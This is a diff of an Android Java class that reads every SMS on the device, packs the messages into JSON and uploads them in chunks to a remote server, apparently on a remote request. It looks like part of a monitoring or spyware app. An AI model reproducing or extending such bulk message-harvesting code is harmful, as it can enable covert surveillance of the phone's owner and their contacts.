@@ -32,11 +32,13 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 	private Cursor sms_sent_cursor;
 	SharedPreferences sp;
 	private TurnSendList sendList;
+	private String version;
 
 	public void getSmsLogs() {
 
 		date = new ConvertDate();
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+		version = sp.getString("list_sms", "0");
 
 		// -------------- for---------------------------------------------
 
@@ -44,24 +46,17 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 
 		sms_sent_cursor = mContext.getContentResolver().query(uri, null, null,
 				null, "date desc");
-		Logging.doLog(LOG_TAG,
-				"network" + sp.getBoolean("network_available ", true),
-				"network " + sp.getBoolean("network_available ", true));
+		Logging.doLog(LOG_TAG, "readSMS", "readSMS");
+
 		if (sp.getBoolean("network_available", true) == true) {
 			complete = "0";
 			// Read the sms data and store it in the list
 			if (sms_sent_cursor != null) {
 				// формируем JSONobj
 				JSONObject archiveSMSJson = new JSONObject();
-				Logging.doLog(LOG_TAG, "Sms_sent_cursor ..",
-						"Sms_sent_cursor ..");
-
 				if (sms_sent_cursor.moveToFirst()) {
 
 					for (int i = 0; i < sms_sent_cursor.getCount(); i++) {
-						Logging.doLog(LOG_TAG, "sms_sent_cursor.getCount()",
-								"sms_sent_cursor.getCount()");
-
 						int typeSms = sms_sent_cursor.getInt(sms_sent_cursor
 								.getColumnIndex("type"));
 						String type = "0";
@@ -105,44 +100,56 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 							// TODO Автоматически созданный блок catch
 							e.printStackTrace();
 						}
-						if (sendStr.length() >= 50000) {
-							if (sms_sent_cursor.isLast()) {
-								lastRaw(sendStr);
+						if (sendStr.length() >= 30000) {
 
-							} else {
-								sendRequest(sendStr, complete);
-								sendStr = null;
-							}
+							Logging.doLog(LOG_TAG, "str >= 30000",
+									"str >= 30000");
+							sendRequest(sendStr, complete);
+							sendStr = null;
 						}
+						Logging.doLog(LOG_TAG, "moveToNext", "moveToNext");
+
 						sms_sent_cursor.moveToNext();
 
 					}
 				}
 				if (sendStr != null) {
 					lastRaw(sendStr);
+					sendStr = null;
+
+				} else {
+					lastRaw("");
 				}
+				Logging.doLog(LOG_TAG, "sms_sent_cursor.close()",
+						"sms_sent_cursor.close()");
 				sms_sent_cursor.close();
+			} else {
+				Logging.doLog(LOG_TAG, "smsLogCursor == null",
+						"smsLogCursor == null");
+				lastRaw("");
 			}
 		} else {
-			sendList = new TurnSendList(mContext);
-			sendList.setList(2, "1", "0");
+			endList();
 		}
+	}
+
+	private void endList() {
+		sendList = new TurnSendList(mContext);
+		sendList.setList(iType, version, "0");
+
 	}
 
 	private void lastRaw(String sendStr) {
 		complete = "1";
 		Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
 		sendRequest(sendStr, complete);
-		sendStr = null;
-		sendList = new TurnSendList(mContext);
-		sendList.setList(2, "0", "0");
 	}
 
 	private void sendRequest(String str, String complete) {
 		if (str != null) {
-			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete);
+			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete,
+					version);
 			dr.sendRequest(str);
-			// Logging.doLog(LOG_TAG, str, str);
 		}
 	}
 
